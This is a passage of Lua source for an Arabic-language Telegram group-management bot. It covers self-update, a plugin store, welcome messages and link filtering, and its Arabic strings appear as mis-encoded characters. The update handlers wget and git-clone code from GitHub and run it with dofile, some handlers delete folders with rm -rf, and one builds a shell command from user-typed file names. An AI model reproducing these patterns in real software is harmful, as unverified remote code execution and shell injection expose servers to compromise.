ββββ EB ββββ
β β«* [πππππΎπ πππΎππ½πΌπ](https://t.me/TEAM_Escobar)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
--     Source Escobar     --
if SecondSudo(msg) then
if text == "ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³" or text == "ΨͺΨ­Ψ―ΩΨ« Ψ³ΩΨ±Ψ³" then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ¬Ψ§Ψ±Ω ΨͺΨ­Ψ―ΩΨ« Ψ³ΩΨ±Ψ³ Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±', 1, 'md') 
os.execute('rm -rf Escobar.lua') 
os.execute('wget https://raw.githubusercontent.com/mfmvip/EscobarTeam/master/Escobar.lua') 
dofile('Escobar.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( ΨͺΩΩΩΩ ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³ )          \n\27[0;34;49m\n") 
Dev_mfm(msg.chat_id_, msg.id_, 1, '*β β« ΨͺΩΩΩΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ« Ψ§ΩΩ Ψ§ΩΨ§Ψ΅Ψ―Ψ§Ψ± Ψ§ΩΨ¬Ψ―ΩΨ―*', 1, 'md') 
end
if text == 'ΨͺΨ­Ψ―ΩΨ«' or text == 'ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ¨ΩΨͺ' or text == 'β ΨͺΨ­Ψ―ΩΨ« β' then  
dofile('Escobar.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n        ( ΨͺΩΩΩΩ ΨͺΨ­Ψ―ΩΨ« ΩΩΩΨ§Ψͺ Ψ§ΩΨ¨ΩΨͺ )        \n\27[0;34;49m\n") 
Dev_mfm(msg.chat_id_, msg.id_, 1, "*β β« ΨͺΩΩΩΩ ΨͺΨ­Ψ―ΩΨ« ΩΩΩΨ§Ψͺ Ψ§ΩΨ¨ΩΨͺ*", 1, "md")
end 
if msg and not Devmfm:get(mustafa..'mfm:Update') then
Devmfm:set(mustafa..'mfm:Update',true)
os.execute('unlink JSON.lua && unlink dkjson.lua')
os.execute('git clone https://github.com/mfmvip/libs') 
dofile('Escobar.lua') 
end
--     Source Escobar     --
if text == 'Ψ§ΩΩΩΩΨ§Ψͺ' then
Files = '\nβ β« Ψ§ΩΩΩΩΨ§Ψͺ Ψ§ΩΩΩΨΉΩΩ ΩΩΩΩ° Ψ§ΩΨ¨ΩΨͺ β β₯‘ \nββββ EB ββββ\n'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
Files = Files..i..'~ : `'..v..'`\n'
end
end
if i == 0 then
Files = 'β β« ΩΨ§ ΨͺΩΨ¬Ψ― ΩΩΩΨ§Ψͺ ΩΩΩΩ° Ψ§ΩΨ¨ΩΨͺ'
end
send(msg.chat_id_, msg.id_,Files)
end
if text == "ΩΨͺΨ¬Ψ± Ψ§ΩΩΩΩΨ§Ψͺ" or text == 'Ψ§ΩΩΨͺΨ¬Ψ±' then
local Get_Files, res = https.request("https://raw.githubusercontent.com/mfmvip/EscobarTeamFiles/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n*β β« ΩΨ’Ψ₯Ψ¦ΩΩΩΩΩΫ ΩΩΩΨ§Ψͺ ΩΨͺΨ¬Ψ± Ψ³ΩΨ±Ψ³ Ψ§Ψ³ΩΩΨ¨Ψ§Ψ±*\n*β β« Ψ§ΩΩΩΩΨ§Ψͺ Ψ§ΩΩΨͺΩΩΨ±Ω Ψ­Ψ§ΩΩΨ§ β β₯‘*\nββββ EB ββββ\n"
local TextE = "ββββ EB ββββ\n*β β« ΨΉΩΨ§ΩΨ© β (β) ΨͺΨΉΩΩ Ψ§ΩΩΩΩ ΩΩΨΉΩ*\n*β β« ΨΉΩΨ§ΩΨ© β (βοΈ) ΨͺΨΉΩΩ Ψ§ΩΩΩΩ ΩΩΨΉΩΨ·Ω*\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local CheckFileisFound = io.open("Files/"..name,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
CheckFile = "(β)"
else
CheckFile = "(βοΈ)"
end
NumFile = NumFile + 1
TextS = TextS.."β β« "..Info..' β β₯‘\n'..NumFile.."~ : `"..name..'` β¬ '..CheckFile.."\n"
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"β β« ΩΨ§ ΩΩΨ¬Ψ― Ψ§ΨͺΨ΅Ψ§Ω ΩΩ Ψ§ΩΩapi") 
end
end
if text == "ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΩΩΩΨ§Ψͺ" or text == "Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ψ§ΩΩΩΩΨ§Ψͺ" then
os.execute("rm -fr Files/*")
send(msg.chat_id_,msg.id_,"*β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ψ§ΩΩΩΩΨ§Ψͺ Ψ§ΩΩΩΨΉΩΩ*")
end
if text and text:match("^(ΨͺΨΉΨ·ΩΩ ΩΩΩ) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(ΨͺΨΉΨ·ΩΩ ΩΩΩ) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/mfmvip/EscobarTeamFiles/master/EscobarTeamFiles/"..FileName)
if Res == 200 then
os.execute("rm -fr Files/"..FileName)
send(msg.chat_id_, msg.id_,"\nβ β« Ψ§ΩΩΩΩ β *"..FileName.."*\nβ β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩΩ ΩΨ­Ψ°ΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ¨ΩΨ¬Ψ§Ψ­") 
dofile('Escobar.lua')  
else
send(msg.chat_id_, msg.id_,"*β β« ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩ Ψ¨ΩΨ°Ψ§ Ψ§ΩΨ§Ψ³Ω*") 
end
end
if text and text:match("^(ΨͺΩΨΉΩΩ ΩΩΩ) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(ΨͺΩΨΉΩΩ ΩΩΩ) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/mfmvip/EscobarTeamFiles/master/EscobarTeamFiles/"..FileName)
if Res == 200 then
local ChekAuto = io.open("Files/"..FileName,'w+')
ChekAuto:write(GetJson)
ChekAuto:close()
send(msg.chat_id_, msg.id_,"\n*β β« Ψ§ΩΩΩΩ β* "..FileName.."\n*β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩΩ ΩΩΩΩ° Ψ§ΩΨ¨ΩΨͺ Ψ¨ΩΨ¬Ψ§Ψ­*") 
dofile('Escobar.lua')  
else
send(msg.chat_id_, msg.id_,"β β« ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩ Ψ¨ΩΨ°Ψ§ Ψ§ΩΨ§Ψ³Ω") 
end
return false
end
end 
--     Source Escobar     --
if text and (text == 'Ψ­Ψ°Ω ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨' or text == 'ΩΨ³Ψ­ ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨') and SecondSudo(msg) then    
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', 1, 'md')   
Devmfm:del(mustafa..'mfm:Text:BotWelcome')
Devmfm:del(mustafa..'mfm:Photo:BotWelcome')
return false
end 
if text and (text == 'ΨͺΩΨΉΩΩ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΨ¨ΩΨͺ' or text == 'ΨͺΩΨΉΩΩ ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨') and SecondSudo(msg) then    
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ ΨΉΩΨ― Ψ§ΨΆΨ§ΩΨ© Ψ§ΩΨ¨ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')   
Devmfm:del(mustafa..'mfm:Lock:BotWelcome')
return false
end 
if text and (text == 'ΨͺΨΉΨ·ΩΩ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΨ¨ΩΨͺ' or text == 'ΨͺΨΉΨ·ΩΩ ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨') and SecondSudo(msg) then    
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ ΨΉΩΨ― Ψ§ΨΆΨ§ΩΨ© Ψ§ΩΨ¨ΩΨͺ ΩΩΩΩ° Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©', 1, 'md')   
Devmfm:set(mustafa..'mfm:Lock:BotWelcome',true)
return false
end 
if text and (text == 'ΨͺΨΊΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨' or text == 'ΨͺΨΊΩΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨' or text == 'β ΨͺΨΊΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ β') and SecondSudo(msg) then    
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ ΩΨ΅ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', 1, 'md') 
Devmfm:del(mustafa..'mfm:Text:BotWelcome')
Devmfm:del(mustafa..'mfm:Photo:BotWelcome')
Devmfm:set(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and Devmfm:get(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±", 1, "md") 
Devmfm:del(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΨ΅ Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩ Ψ΅ΩΨ±Ψ© Ψ§ΩΨͺΨ±Ψ­ΩΨ¨\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β Ψ§ΩΨΊΨ§Ψ‘ ΩΨ­ΩΨΈ Ψ§ΩΩΨ΅ ΩΩΨ·", 1, 'md')   
Devmfm:set(mustafa.."mfm:Text:BotWelcome",text) 
Devmfm:set(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if Devmfm:get(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΨ΅ ΩΨ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ΅ΩΨ±Ψ© Ψ§ΩΨͺΨ±Ψ­ΩΨ¨", 1, "md") 
Devmfm:del(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
Devmfm:set(mustafa.."mfm:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΨ΅ ΩΨ΅ΩΨ±Ψ© Ψ§ΩΨͺΨ±Ψ­ΩΨ¨", 1, 'md')   
Devmfm:del(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
--     Source Escobar     --
if text and text:match("^ΨΆΨΉ ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±$") or text and text:match("^ΩΨΆΨΉ ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±$") or text and text:match("^ΨͺΨΊΩΩΨ± ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±$") then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ψ© Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ω ", 1, "md")
Devmfm:setex(mustafa.."mfm:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^ΩΨ³Ψ­ ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±$") or text and text:match("^Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΩΨ·ΩΨ±$") then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω ΩΩΩΨ΄Ψ© Ψ§ΩΩΨ·ΩΨ±", 1, "md")
Devmfm:del(mustafa.."DevText")
end end
--     Source Escobar     --
if Devmfm:get(mustafa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±", 1, "md") 
Devmfm:del(mustafa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
Devmfm:del(mustafa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
Devmfm:set(mustafa..'mfm:textch:user',texxt)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ ΨͺΨΊΩΩΨ± ΩΩΩΨ΄Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω', 1, 'md')
end
if text and text:match("^ΨͺΨΊΩΨ± ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω$") and SecondSudo(msg) or text and text:match("^ΨͺΨΊΩΩΨ± ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω$") and SecondSudo(msg) then  
Devmfm:setex(mustafa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
local text = 'β β« Ψ­Ψ³ΩΨ§ Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ¬Ψ―ΩΨ―Ω'  
Dev_mfm(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω" or text == "Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω" then  
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
Devmfm:del(mustafa..'mfm:textch:user')
textt = "β β« ΨͺΩΩΩΩ Ψ­Ψ°Ω ΩΩΩΨ΄Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω"
Dev_mfm(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω' or text == 'Ψ¬ΩΨ¨ ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω' then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ· ', 1, 'md')
else
local chtext = Devmfm:get(mustafa.."mfm:textch:user")
if chtext then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩΩΨ΄Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω β β₯‘ \nββββ EB ββββ\n['..chtext..']', 1, 'md')
else
local Devmfm6 = Devmfm:get(mustafa.."Devmfm3")
if Devmfm6 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨΉΩΩΩ Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω ΩΩΩΩ° ΩΩΨ§Ψ© Ψ§ΩΨ¨ΩΨͺ \nβ β« ΩΩΨ§Ψ© Ψ§ΩΨ¨ΩΨͺ β '..Devmfm6, 1, "html")
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩ ΩΨͺΩ ΨͺΨΉΩΩΩ ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω \nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β ΨͺΨΉΩΩΩ ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω ΩΩΨͺΨΉΩΩΩ ', 1, 'md')
end end end end
--     Source Escobar     --
if text == 'Ψ§ΩΩΩΨ§Ψ©' or text == 'ΩΩΨ§Ψ© Ψ§ΩΨ³ΩΨ±Ψ³' or text == 'ΩΩΨ§Ω Ψ§ΩΨ³ΩΨ±Ψ³' or text == 'ΩΩΨ§Ψͺ Ψ§ΩΨ³ΩΨ±Ψ³' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Channel β¬ @TEAM_Escobar', 1, 'html')    
end 
--     Source Escobar     --
if Sudo(msg) then 
if text == 'ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨ³ΩΨ±ΩΨ±' or text == 'Ψ§ΩΨ³ΩΨ±ΩΨ±' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}'`
echo 'β β« ΩΨΈΨ§Ω Ψ§ΩΨͺΨ΄ΨΊΩΩ β β₯‘\n`'"$LinuxVersion"'`' 
echo 'ββββ EB ββββ\nβ β« Ψ§ΩΨ°Ψ§ΩΨ±Ω Ψ§ΩΨΉΨ΄ΩΨ§Ψ¦ΩΩ β β₯‘\n`'"$MemoryUsage"'`'
echo 'ββββ EB ββββ\nβ β« ΩΨ­Ψ―Ψ© Ψ§ΩΨͺΨ?Ψ²ΩΩ β β₯‘\n`'"$HardDisk"'`'
echo 'ββββ EB ββββ\nβ β« Ψ§ΩΩΨΉΨ§ΩΨ¬ β β₯‘\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo 'ββββ EB ββββ\nβ β« Ψ§ΩΨ―Ψ?ΩΩ β β₯‘\n`'`whoami`'`'
echo 'ββββ EB ββββ\nβ β« ΩΨ―Ψ© ΨͺΨ΄ΨΊΩΩ Ψ§ΩΨ³ΩΨ±ΩΨ± β β₯‘\n`'"$UpTime"'`'
]]):read('*a'), 1, 'md')
end
end
--     Source Escobar     --
EscobarTeamFiles(msg)
--     Source Escobar     --
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
Devmfm:incr(mustafa..'mfm:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
Media = 'Ψ§ΩΩΩΨ―ΩΨ§'
if result.content_.ID == "MessagePhoto" then Media = 'Ψ§ΩΨ΅ΩΨ±Ω'
elseif result.content_.ID == "MessageSticker" then Media = 'Ψ§ΩΩΩΨ΅Ω'
elseif result.content_.ID == "MessageVoice" then Media = 'Ψ§ΩΨ¨Ψ΅ΩΩ'
elseif result.content_.ID == "MessageAudio" then Media = 'Ψ§ΩΨ΅ΩΨͺ'
elseif result.content_.ID == "MessageVideo" then Media = 'Ψ§ΩΩΩΩΩ°Ψ―ΩΩ'
elseif result.content_.ID == "MessageAnimation" then Media = 'Ψ§ΩΩΨͺΨ­Ψ±ΩΩ'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local mfmname = 'β β« Ψ’ΩΩΨΉΨΆΩΩΩΩ β ['..dp.first_name_..'](tg://user?id='..dp.id_..')'
local mfmid = 'β β« Ψ§ΩΨ―ΩΩ β `'..dp.id_..'`'
local mfmtext = 'β β« ΩΨ§Ω Ψ¨Ψ§ΩΨͺΨΉΨ―ΩΩ ΨΉΩΩ '..Media
local mfmtxt = 'ββββ EB ββββ\nβ β« ΨͺΨΉΨ§ΩΩ ΩΨ§ΩΨ΄Ψ±ΩΩΩΩ°Ω Ψ§ΩΩ ΩΨ?Ψ±Ψ¨'
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_  
text = '\nββββ EB ββββ\n'
for i=0 , #admins do 
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
SendText(msg.chat_id_, mfmname..'\n'..mfmid..'\n'..mfmtext..text..mfmtxt,0,'md') 
end
end,nil)
end
end,nil)
end,nil)
end
if not VipMem(result) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end,nil)
--     Source Escobar     --
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = Devmfm:get(mustafa..'mfm:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;Devmfm:del(mustafa..'mfm:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) Devmfm:del(mustafa..'mfm:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) Devmfm:del(mustafa..'mfm:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) Devmfm:del(mustafa..'mfm:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
--     Source Escobar     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mΨ¬Ψ§Ψ±Ω ΨͺΩΨΈΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΩΩΩΩΩ ΩΨ±Ψ¬Ω Ψ§ΩΨ§ΩΨͺΨΈΨ§Ψ±\n\27[1;37m')
local PvList = Devmfm:smembers(mustafa..'mfm:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = Devmfm:smembers(mustafa..'mfm:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=mustafa,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
Devmfm:srem(mustafa..'mfm:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
Devmfm:srem(mustafa..'mfm:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
Devmfm:srem(mustafa..'mfm:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
Devmfm:srem(mustafa..'mfm:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
Devmfm:sadd(mustafa..'mfm:Groups',v)  
end end,nil) end
end
--     Source Escobar     --
end 
------------------------------------------------
-- This Source Was Developed By (Escobar) @MFMVIP - @F16_ibra --
--     This Is The πππππΎπ πππΎππ½πΌπ @TEAM_Escobar      --
--          -- https://t.me/TEAM_Escobar --          --
------------------------------------------------
